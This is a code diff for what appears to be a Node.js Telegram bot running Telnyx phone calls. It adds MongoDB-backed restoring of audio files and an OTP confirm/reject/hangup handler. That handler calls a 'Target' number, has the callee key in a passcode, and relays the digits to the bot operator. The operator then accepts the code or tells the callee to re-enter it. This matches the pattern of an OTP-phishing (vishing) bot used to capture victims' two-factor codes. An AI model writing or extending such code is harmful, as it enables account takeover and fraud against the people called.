@@ -13,6 +13,35 @@ earlyApp.use(express.json({ limit: '50mb' }))
 earlyApp.use(express.urlencoded({ extended: true, limit: '50mb' }))
 earlyApp.use('/assets', express.static(require('path').join(__dirname, 'assets')))
 
+// ── Fallback middleware for /assets/user-audio/ — Restore from MongoDB if file missing from ephemeral disk ──
+// Railway's filesystem is ephemeral: redeploying wipes all generated audio files.
+// If the static middleware above returns 404, this middleware attempts to restore from ivrAudioStore.
+earlyApp.use('/assets/user-audio', async (req, res, next) => {
+  const path = require('path')
+  const fs = require('fs')
+  const localPath = path.join(__dirname, 'assets', 'user-audio', req.path)
+  if (fs.existsSync(localPath)) return next() // Already served by express.static above
+  
+  try {
+    if (!db) return next()
+    const filename = path.basename(req.path)
+    // Search by filename in ivrAudioStore
+    const stored = await db.collection('ivrAudioStore').findOne({ filename })
+    if (stored && stored.buffer) {
+      const dir = path.dirname(localPath)
+      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })
+      fs.writeFileSync(localPath, Buffer.from(stored.buffer, 'base64'))
+      log(`[AudioRestore] Restored ${filename} from MongoDB to disk`)
+      res.set('Content-Type', 'audio/mpeg')
+      res.set('Cache-Control', 'public, max-age=3600')
+      return fs.createReadStream(localPath).pipe(res)
+    }
+  } catch (e) {
+    log(`[AudioRestore] Failed for ${req.path}: ${e.message}`)
+  }
+  next() // Let it 404 naturally if not found in MongoDB either
+})
+
 let appReady = false
 let serverStartTime = new Date()
 
@@ -1493,6 +1522,8 @@ const loadData = async () => {
   phoneLogs = db.collection('phoneLogs')
   ivrAnalytics = db.collection('ivrAnalytics')
   ivrAudioStore = db.collection('ivrAudioStore') // Persistent IVR audio storage (survives Railway redeploys)
+  // Pass db to tts-service for audio persistence
+  try { require('./tts-service.js').setDb(db) } catch (e) { log(`[TTS] setDb failed: ${e.message}`) }
   cnamCache = db.collection('cnamCache')
   digitalOrdersCol = db.collection('digitalOrders')
 
@@ -3368,6 +3399,103 @@ Tap a button below to change. Changes sync to your phone on next app open.`
           )
         } catch (e) { /* message might be too old to edit */ }
         log(`[SingleIVR-OTP] Bot user REJECTED OTP for session=${sessionId} digits=${session.otpDigits} (attempt ${session.otpAttempt}/${maxAttempts})`)
+        return
+      }
+      return
+    }
+
+    // ── Telnyx IVR OTP Confirm/Reject/Hangup handler ──
+    if (chatId && (data.startsWith('otp_confirm:') || data.startsWith('otp_reject:') || data.startsWith('otp_hangup:'))) {
+      try { await bot.answerCallbackQuery(query.id) } catch (e) { /* ignore */ }
+      const parts = data.split(':')
+      const action = parts[0]  // 'otp_confirm', 'otp_reject', 'otp_hangup'
+      const callControlId = parts[1]
+      const voiceService = require('./voice-service.js')
+      const _telnyxApi = require('./telnyx-service.js')
+      const session = voiceService.outboundIvrCalls[callControlId]
+
+      if (!session) {
+        return bot.sendMessage(chatId, '⚠️ Session expired or call already ended.', { parse_mode: 'HTML' }).catch(() => {})
+      }
+
+      if (session.phase !== 'otp_hold') {
+        return bot.sendMessage(chatId, `⚠️ OTP already processed (phase: ${session.phase}).`, { parse_mode: 'HTML' }).catch(() => {})
+      }
+
+      if (action === 'otp_confirm') {
+        session.phase = 'otp_confirmed'
+        session.otpStatus = 'confirmed'
+        try {
+          await bot.editMessageText(
+            `✅ <b>OTP Confirmed!</b>\n\n📞 Target: <b>${session.targetNumber}</b>\n🔢 Code: <code>${session.otpDigits}</code>\n\n✅ Confirmed — caller will hear success message and be transferred.`,
+            { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML' }
+          )
+        } catch (e) { /* ignore */ }
+        // Speak confirmation to caller and transfer to bot user's number
+        const confirmMsg = session.otpConfirmMsg || 'Your code has been verified. Connecting you now.'
+        await _telnyxApi.speakOnCall(callControlId, confirmMsg, 'female').catch(() => {})
+        // Transfer to the IVR number (bot user's number)
+        setTimeout(async () => {
+          try {
+            await _telnyxApi.transferCall(callControlId, session.ivrNumber, session.callerId)
+          } catch (e) { log(`[OTP-Telnyx] Transfer after confirm failed: ${e.message}`) }
+        }, 3000)
+        log(`[OTP-Telnyx] Bot user CONFIRMED OTP for callControlId=${callControlId} digits=${session.otpDigits}`)
+        return
+      }
+
+      if (action === 'otp_reject') {
+        const maxAttempts = session.otpMaxAttempts || 3
+        session.otpAttempt = (session.otpAttempt || 1)
+        const remaining = maxAttempts - session.otpAttempt
+
+        if (remaining > 0) {
+          session.phase = 'otp_gathering'
+          session.otpStatus = 'retry'
+          session.otpDigits = null
+          try {
+            await bot.editMessageText(
+              `❌ <b>OTP Rejected</b>\n\n📞 Target: <b>${session.targetNumber}</b>\n⏳ Asking caller to re-enter (${remaining} attempt${remaining > 1 ? 's' : ''} left).`,
+              { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML' }
+            )
+          } catch (e) { /* ignore */ }
+          // Ask caller to re-enter
+          const rejectMsg = session.otpRejectMsg || `That code was not accepted. Please enter your ${session.otpLength}-digit code again.`
+          await _telnyxApi.gatherDTMFWithSpeak(callControlId, rejectMsg, 'female', {
+            minDigits: session.otpLength || 4,
+            maxDigits: session.otpLength || 6,
+            timeout: 30000,
+            interDigitTimeout: 5000,
+            validDigits: '0123456789',
+          }).catch(() => {})
+        } else {
+          session.phase = 'otp_failed'
+          session.otpStatus = 'rejected_final'
+          try {
+            await bot.editMessageText(
+              `🚫 <b>OTP Rejected (Final)</b>\n\n📞 Target: <b>${session.targetNumber}</b>\n❌ No attempts remaining — disconnecting caller.`,
+              { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML' }
+            )
+          } catch (e) { /* ignore */ }
+          await _telnyxApi.speakOnCall(callControlId, 'Your code could not be verified. Goodbye.', 'female').catch(() => {})
+          setTimeout(() => _telnyxApi.hangupCall(callControlId).catch(() => {}), 3000)
+        }
+        log(`[OTP-Telnyx] Bot user REJECTED OTP for callControlId=${callControlId} (attempt ${session.otpAttempt}/${maxAttempts})`)
+        return
+      }
+
+      if (action === 'otp_hangup') {
+        session.phase = 'otp_hungup'
+        session.otpStatus = 'manual_hangup'
+        try {
+          await bot.editMessageText(
+            `📵 <b>Call Ended</b>\n\n📞 Target: <b>${session.targetNumber}</b>\n📵 You chose to hang up the call.`,
+            { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML' }
+          )
+        } catch (e) { /* ignore */ }
+        await _telnyxApi.speakOnCall(callControlId, 'Goodbye.', 'female').catch(() => {})
+        setTimeout(() => _telnyxApi.hangupCall(callControlId).catch(() => {}), 1500)
+        log(`[OTP-Telnyx] Bot user HUNGUP for callControlId=${callControlId}`)
         return
       }
       return
@@ -21118,6 +21246,22 @@ Professional templates for voicemail, customer support, financial institutions, 
         vm.customAudioGreetingUrl = draft.audioUrl || draft.audioPath
         vm.customGreetingText = draft.text || null
         vm.greetingVoice = draft.voice || null
+        // ── Persist voicemail greeting audio in MongoDB (survives Railway redeploys) ──
+        try {
+          const audioBuffer = require('fs').readFileSync(draft.audioPath)
+          const filename = require('path').basename(draft.audioPath)
+          await ivrAudioStore.updateOne(
+            { _id: num.phoneNumber + ':vmGreeting' },
+            { $set: { buffer: audioBuffer.toString('base64'), filename, audioUrl: vm.customAudioGreetingUrl, updatedAt: new Date() } },
+            { upsert: true }
+          )
+          // Also store by filename for the /assets/user-audio middleware
+          await ivrAudioStore.updateOne(
+            { filename },
+            { $set: { buffer: audioBuffer.toString('base64'), filename, createdAt: new Date() } },
+            { upsert: true }
+          )
+        } catch (e) { log(`[VM] Greeting audio persist to MongoDB failed (non-blocking): ${e.message}`) }
       } else if (draft.text) {
         vm.customGreetingText = draft.text
         vm.customAudioGreetingUrl = null
@@ -28712,6 +28856,23 @@ app.get('/twilio/audio-proxy', async (req, res) => {
         res.set('Cache-Control', 'public, max-age=3600')
         return require('fs').createReadStream(localPath).pipe(res)
       }
+      // ── File missing from disk — try restoring from MongoDB ──
+      try {
+        const filename = require('path').basename(localPath)
+        const stored = await db.collection('ivrAudioStore').findOne({ filename })
+        if (stored && stored.buffer) {
+          const dir = require('path').dirname(localPath)
+          if (!require('fs').existsSync(dir)) require('fs').mkdirSync(dir, { recursive: true })
+          require('fs').writeFileSync(localPath, Buffer.from(stored.buffer, 'base64'))
+          log(`[AudioProxy] Restored ${filename} from MongoDB to disk`)
+          res.set('Content-Type', 'audio/mpeg')
+          res.set('Cache-Control', 'public, max-age=3600')
+          return require('fs').createReadStream(localPath).pipe(res)
+        }
+      } catch (restoreErr) {
+        log(`[AudioProxy] MongoDB restore failed: ${restoreErr.message}`)
+      }
+      // File truly doesn't exist — fall through to external fetch (will likely 404)
     }
 
     // External URL — proxy with correct Content-Type
